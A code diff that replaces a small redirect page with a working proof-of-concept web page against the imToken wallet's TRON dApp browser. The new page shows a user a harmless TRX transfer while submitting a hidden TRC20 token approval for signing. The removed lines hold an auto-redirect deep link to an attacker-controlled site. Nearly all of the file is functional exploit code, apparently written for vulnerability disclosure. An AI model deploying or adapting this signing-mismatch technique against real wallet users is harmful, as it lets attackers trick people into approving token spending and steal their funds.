@@ -1,15 +1,162 @@
-<!DOCTYPE html>
-<html>
-<head><title>Zero-Click PoC</title></head>
-<body>
-<h1>Legitimate-looking page</h1>
-<p>This page silently redirects to MetaMask in vulnerable dApp browsers.</p>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TRON sendTransaction preview mismatch PoC</title>
+  </head>
+  <body>
+    <input id="previewRecipient" value="T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb" />
+    <input id="previewAmount" value="10000" />
+    <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+    <input id="spender" placeholder="defaults to current address" />
+    <input id="approveAmount" value="1" />
+    <input id="rpcUrl" value="https://api.trongrid.io" />
+    <button id="runBtn">Build PoC payload and invoke tron.sendTransaction</button>
+    <pre id="status"></pre>
+    <pre id="previewTx"></pre>
+    <pre id="approveTx"></pre>
 
-<script>
-// 使用 window.location 自动触发重定向
-setTimeout(function() {
-  window.location.href = "imtokenv2://dapp/https://attacker-controlled-site.com";
-}, 2000);
-</script>
-</body>
+    <script>
+      const $ = (id) => document.getElementById(id);
+      const statusEl = $('status');
+      const previewEl = $('previewTx');
+      const approveEl = $('approveTx');
+      const runBtn = $('runBtn');
+
+      function setStatus(value) {
+        statusEl.textContent = value;
+      }
+
+      function safeStringify(value) {
+        return JSON.stringify(value, null, 2);
+      }
+
+      function getCurrentAccount() {
+        const account = window.tronWeb?.defaultAddress?.base58;
+        if (!account) {
+          throw new Error('No TRON account detected. Please open this page inside imToken with a TRON wallet selected.');
+        }
+        return account;
+      }
+
+      async function postJson(url, body) {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status} from ${url}`);
+        }
+        return await response.json();
+      }
+
+      function normalizeRpcUrl() {
+        const uiValue = $('rpcUrl').value.trim();
+        const providerValue = window.tronWeb?.fullNode?.host;
+        return (uiValue || providerValue || 'https://api.trongrid.io').replace(/\/$/, '');
+      }
+
+      function encodeApproveParams(spender, amount) {
+        const spenderHex = window.tronWeb.address
+          .toHex(spender)
+          .replace(/^41/, '')
+          .padStart(64, '0');
+        const amountHex = BigInt(amount).toString(16).padStart(64, '0');
+        return spenderHex + amountHex;
+      }
+
+      async function buildPreviewTransfer(from) {
+        const rpc = normalizeRpcUrl();
+        const result = await postJson(`${rpc}/wallet/createtransaction`, {
+          owner_address: from,
+          to_address: $('previewRecipient').value.trim(),
+          amount: Number($('previewAmount').value.trim()),
+          visible: true,
+        });
+        if (result.Error) {
+          throw new Error(`createtransaction failed: ${result.Error}`);
+        }
+        return result;
+      }
+
+      async function buildApprove(from, spender) {
+        const rpc = normalizeRpcUrl();
+        const result = await postJson(`${rpc}/wallet/triggersmartcontract`, {
+          owner_address: from,
+          contract_address: $('tokenContract').value.trim(),
+          function_selector: 'approve(address,uint256)',
+          parameter: encodeApproveParams(spender, $('approveAmount').value.trim()),
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true,
+        });
+        if (!result?.result?.result || !result?.transaction?.raw_data_hex) {
+          throw new Error(`triggersmartcontract failed: ${safeStringify(result)}`);
+        }
+        return result;
+      }
+
+      function buildMismatchedTx(previewTransfer, approveTx) {
+        return {
+          ...approveTx.transaction,
+          raw_data: previewTransfer.raw_data,
+          raw_data_hex: approveTx.transaction.raw_data_hex,
+          txID: approveTx.transaction.txID,
+        };
+      }
+
+      async function run() {
+        runBtn.disabled = true;
+        try {
+          const account = getCurrentAccount();
+          const spender = $('spender').value.trim() || account;
+
+          const previewTransfer = await buildPreviewTransfer(account);
+          previewEl.textContent = safeStringify(previewTransfer.raw_data);
+
+          const approveTx = await buildApprove(account, spender);
+          const approveData = approveTx.transaction.raw_data.contract[0].parameter.value.data;
+          approveEl.textContent = safeStringify({
+            txID: approveTx.transaction.txID,
+            raw_data_hex: approveTx.transaction.raw_data_hex,
+            selector: approveData.slice(0, 8),
+            approve_data: approveData,
+          });
+
+          if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3') {
+            throw new Error(`Unexpected approve selector: ${approveData.slice(0, 8)}`);
+          }
+
+          const tx = buildMismatchedTx(previewTransfer, approveTx);
+
+          if (!window.imToken?.callPromisifyAPI) {
+            throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
+          }
+
+          const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+            from: account,
+            tx,
+            useTronHeader: true,
+          });
+
+          setStatus(
+            [
+              'imToken returned successfully.',
+              `returned hash: ${result}`,
+              `expected approve txID: ${approveTx.transaction.txID}`,
+            ].join('\n')
+          );
+        } catch (error) {
+          console.error(error);
+          setStatus(`Error: ${error.message || String(error)}`);
+        } finally {
+          runBtn.disabled = false;
+        }
+      }
+
+      runBtn.addEventListener('click', run);
+    </script>
+  </body>
 </html>
